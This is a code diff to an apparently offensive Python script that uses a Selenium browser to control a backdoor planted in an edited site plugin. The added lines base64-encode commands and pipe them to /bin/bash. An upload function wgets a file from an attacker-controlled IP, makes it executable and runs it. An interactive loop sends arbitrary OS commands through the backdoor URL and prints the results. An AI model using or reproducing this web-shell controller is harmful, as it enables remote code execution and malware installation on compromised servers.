@@ -199,16 +199,19 @@ def select_plugin():
         print(f"Edit Plugin Fail : {e}")
         exit(-1)
     return p_name, f_name, p_orginal
-    
+
+def crate_payload(cmd):
+    message_bytes = cmd.encode('ascii')
+    base64_bytes = base64.b64encode(message_bytes)
+    base64_message = base64_bytes.decode('ascii')
+    payload = f'echo {base64_message} | base64 -d | /bin/bash'
+    return payload
+
 def upload_malware(backdoor_url, file):
     try:
         ip = "192.168.178.115"
-        cmd = f"wget http://{ip}:8000/{file}; chmod +x {file}; ./{file}"
-        message_bytes = cmd.encode('ascii')
-        base64_bytes = base64.b64encode(message_bytes)
-        base64_message = base64_bytes.decode('ascii')
-        cmd = f'echo {base64_message} | base64 -d | /bin/bash'
-        driver.get(f'{backdoor_url}?0={cmd}')
+        cmd = f"wget http://{ip}:8000/{file}; chmod +x {file} ; ./{file} 2>&1 &"
+        driver.get(f'{backdoor_url}?0={crate_payload(cmd)}')
     except:
         pass
 
@@ -226,7 +229,7 @@ def exec_cmd(p_name, f_name, p_orginal):
         print('File with backdoor is missing or dont work')
         exit(-1)
     backdoor_url = driver.current_url # URL where the backdoor is located
-    logging.info(f'Execute backdoor at: {backdoor_url}')
+    print(f'Execute backdoor at: {backdoor_url}')
     # wait for user input
     while True:
         try:
@@ -241,7 +244,7 @@ def exec_cmd(p_name, f_name, p_orginal):
                 file = cmd.split(' ')[1]
                 upload_malware(backdoor_url, file)
             else: # send os command
-                driver.get(f'{backdoor_url}?0={cmd}')
+                driver.get(f'{backdoor_url}?0={crate_payload(cmd)}')
                 cleantext = BeautifulSoup(driver.page_source, "lxml").text # remove html code from command output
                 if 'HTTP ERROR 500' not in cleantext: # output only valide commands
                     print(cleantext)
